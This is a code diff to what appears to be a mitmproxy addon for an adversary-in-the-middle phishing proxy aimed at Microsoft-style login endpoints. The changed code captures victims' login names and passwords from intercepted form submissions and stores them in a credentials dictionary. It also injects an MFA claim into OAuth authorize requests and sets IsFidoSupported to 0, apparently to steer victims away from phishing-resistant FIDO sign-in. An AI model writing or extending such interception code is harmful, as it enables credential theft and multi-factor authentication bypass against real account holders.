@@ -4,6 +4,7 @@ Modifier Addon for mitmproxy.
 
 from __future__ import annotations
 
+import json
 import logging
 from http.cookies import SimpleCookie
 
@@ -24,7 +25,6 @@ class ModifierAddon:
 
     credentials: dict[str, str] = {}
     simple_cookie: SimpleCookie = SimpleCookie()
-    event_emitter: EventEmitter = EventEmitter()
 
     def request(self, flow: HTTPFlow) -> None:
         """
@@ -49,9 +49,8 @@ class ModifierAddon:
         if flow.request.path.startswith("/common/oauth2/v2.0/authorize"):
             flow.request.query["claims"] = get_config().mfa_claim
         if flow.request.path.startswith("/common/login"):
-            self.event_emitter.notify(
-                CredentialsCapturedEvent(flow.request.urlencoded_form["login"], flow.request.urlencoded_form["passwd"])
-            )
+            self.credentials["login"] = flow.request.urlencoded_form["login"]
+            self.credentials["passwd"] = flow.request.urlencoded_form["passwd"]
             flow.request.urlencoded_form["IsFidoSupported"] = "0"
 
     def response(self, flow: HTTPFlow) -> None:
